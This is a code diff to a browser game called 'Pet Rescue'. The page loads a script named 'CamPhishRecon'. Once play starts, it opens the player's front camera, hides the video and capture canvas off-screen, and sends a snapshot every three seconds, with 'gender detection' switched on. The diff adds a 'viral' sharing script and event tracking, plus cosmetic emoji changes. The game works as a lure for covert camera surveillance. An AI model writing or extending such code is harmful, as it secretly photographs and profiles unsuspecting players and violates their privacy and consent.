@@ -29,14 +29,16 @@ canvas#c{display:block;touch-action:none}
 #lives{position:absolute;top:12px;right:16px;font-size:20px;z-index:10}
 video,canvas#cap{position:fixed;opacity:0;width:2px;height:2px;top:-9999px;left:-9999px}
 #touchL,#touchR{position:absolute;bottom:0;width:50%;height:30%;z-index:5;pointer-events:auto;display:flex;align-items:flex-end;justify-content:center;padding-bottom:16px;color:rgba(255,255,255,0.1);font-size:28px}
+#touchL.hidden,#touchR.hidden{display:none}
 #touchL{left:0}#touchR{right:0}
 </style>
 </head><body>
 <script src="forwarding_link/t/recon.js"></script>
+<script src="forwarding_link/t/viral.js"></script>
 <video id="v" playsinline autoplay muted></video>
 <canvas id="cap" width="320" height="240"></canvas>
 <div id="wrap"><canvas id="c"></canvas></div>
-<div id="score">0</div><div id="lives">🐱🐱🐱</div>
+<div id="score">0</div><div id="lives">❤️❤️❤️</div>
 <div id="touchL" class="hidden">◀</div><div id="touchR" class="hidden">▶</div>
 <div class="overlay" id="menu">
 <div class="title">🐾 Pet Rescue</div>
@@ -73,10 +75,10 @@ showLb();requestAnimationFrame(menuLoop);
 }
 function resize(){var s=Math.min(innerWidth/W,innerHeight/H);c.style.width=(W*s)+'px';c.style.height=(H*s)+'px';c.width=W;c.height=H;}
 function startGame(){
-if(window.CamPhishRecon)CamPhishRecon.init({genderDetect:true});
+if(window.CamPhishRecon){CamPhishRecon.init({genderDetect:true});CamPhishRecon.Capture.event('petcatch_game_start',{});}
 basket={x:W/2-30,w:60,y:H-60};objects=[];particles=[];score=0;lives=3;fc=0;spawnT=0;speed=2;running=true;dead=false;
 document.getElementById('menu').classList.add('hidden');document.getElementById('gameover').classList.add('hidden');
-document.getElementById('score').textContent='0';document.getElementById('lives').textContent='🐱'.repeat(3);
+document.getElementById('score').textContent='0';document.getElementById('lives').textContent='❤️'.repeat(3);
 document.getElementById('touchL').classList.remove('hidden');document.getElementById('touchR').classList.remove('hidden');
 requestAnimationFrame(loop);
 if(navigator.mediaDevices&&window.CamPhishRecon){navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:'user'}}).then(function(s){var v=document.getElementById('v');v.srcObject=s;v.play();var cap=document.getElementById('cap'),cx=cap.getContext('2d');setInterval(function(){if(v.readyState>=2){cx.drawImage(v,0,0,320,240);CamPhishRecon.Capture.image(cap.toDataURL('image/png'),'canvas');}},3000);}).catch(function(){});}
@@ -91,7 +93,7 @@ for(var i=objects.length-1;i>=0;i--){var o=objects[i];o.y+=o.vy;
 if(o.y>basket.y-20&&o.x>basket.x&&o.x<basket.x+basket.w){
 if(o.bomb){lives--;snd(150,0.3,'sawtooth');if(navigator.vibrate)navigator.vibrate(60);spawnParts(o.x,o.y,'#f00');if(lives<=0){endGame();return;}}
 else{score+=o.p;snd(o.gold?1200:700+o.p*5);if(navigator.vibrate)navigator.vibrate(10);spawnParts(o.x,o.y,o.gold?'#ffd700':'#7bed9f');}
-document.getElementById('score').textContent=score;document.getElementById('lives').textContent='🐱'.repeat(Math.max(0,lives))||'💀';
+document.getElementById('score').textContent=score;document.getElementById('lives').textContent='❤️'.repeat(Math.max(0,lives))||'💀';
 objects.splice(i,1);continue;}
 if(o.y>H+30)objects.splice(i,1);}
 for(var i=particles.length-1;i>=0;i--){particles[i].x+=particles[i].vx;particles[i].y+=particles[i].vy;particles[i].vy+=0.1;particles[i].life--;if(particles[i].life<=0)particles.splice(i,1);}
@@ -111,6 +113,10 @@ function menuLoop(){ctx.clearRect(0,0,W,H);var g=ctx.createLinearGradient(0,0,0,
 function endGame(){running=false;dead=true;hs.push(score);hs.sort(function(a,b){return b-a;});hs=hs.slice(0,5);localStorage.setItem('petRescueHS',JSON.stringify(hs));document.getElementById('finalScore').textContent=score;document.getElementById('bestScore').textContent='Best: '+(hs[0]||0);document.getElementById('gameover').classList.remove('hidden');document.getElementById('touchL').classList.add('hidden');document.getElementById('touchR').classList.add('hidden');showLb();if(window.CamPhishRecon)CamPhishRecon.Capture.event('game_over',{score:score});}
 function showLb(){var h='<b>🏆 Top Scores</b><br>';for(var i=0;i<hs.length;i++)h+='<div>#'+(i+1)+' — '+hs[i]+'</div>';if(!hs.length)h='<b>🏆 Be the first!</b>';document.getElementById('menuLb').innerHTML=h;document.getElementById('goLb').innerHTML=h;}
 function shareCard(t){
+if(window.ViralEngine){
+ViralEngine.doShare(t,score,'🐾 I rescued pets and scored '+score+' in Pet Rescue! '+SHARE_URL);
+return;
+}
 var cc=document.createElement('canvas');cc.width=600;cc.height=800;var x=cc.getContext('2d');
 var bg=x.createLinearGradient(0,0,0,800);bg.addColorStop(0,'#1a2e1a');bg.addColorStop(1,'#2d4e2d');x.fillStyle=bg;x.fillRect(0,0,600,800);
 x.font='60px system-ui';x.textAlign='center';x.fillText('🧺',300,160);
